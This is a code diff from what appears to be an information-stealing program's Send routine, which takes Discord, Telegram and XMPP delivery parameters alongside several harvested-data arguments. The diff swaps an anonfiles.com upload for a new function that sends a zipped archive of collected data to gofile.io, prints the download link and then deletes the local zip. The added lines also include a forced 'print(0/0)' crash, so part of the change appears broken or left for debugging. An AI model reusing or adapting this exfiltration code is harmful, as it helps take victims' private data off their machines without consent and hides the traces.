@@ -13,6 +13,22 @@ from requests import post, get
 from os import remove
 
 
+def upload_file_to_gofile(file_path):
+	try:
+		server = get("https://api.gofile.io/getServer")
+		if server.status_code == 200:
+			json = server.json()
+			server = json.get("data").get("server")
+		url = f"https://{server}.gofile.io/uploadFile"
+		response = post(url, files={"upload_file": open(file_path, "rb")})
+		if response.status_code == 200:
+			json_data = response.json()
+			if json_data.get("status") == "ok":
+				return json_data["data"]["downloadPage"]
+	except Exception as e:
+		print(e)
+		return None
+
 def Send(type,np,data,dataB,dataO,dataW,dataF,dataV,discordData,TelegramData,xmppData):
 	if type == 2:
 		from xmpp import protocol,Client
@@ -21,19 +37,10 @@ def Send(type,np,data,dataB,dataO,dataW,dataF,dataV,discordData,TelegramData,xmp
 		
 		
 	try:
+		url = upload_file_to_gofile(rf'{np[0]}.zip')
+		print(url)
+		print(0/0)
 		
-		num = np[0].rfind("\\")
-		name = np[0][num+1:]
-		arr = open(rf'{np[0]}.zip', 'rb')
-		files = {
-    		'file': (f'{name}.zip', arr),
-		}
-		url = 'https://api.anonfiles.com/upload'
-		response = post(url, files=files)
-		dataMain = response.json()
-		url = dataMain['data']['file']['url']['short']
-		arr.close()
-
 		try:
 			remove(f'{np[0]}.zip')
 		except Exception as e:
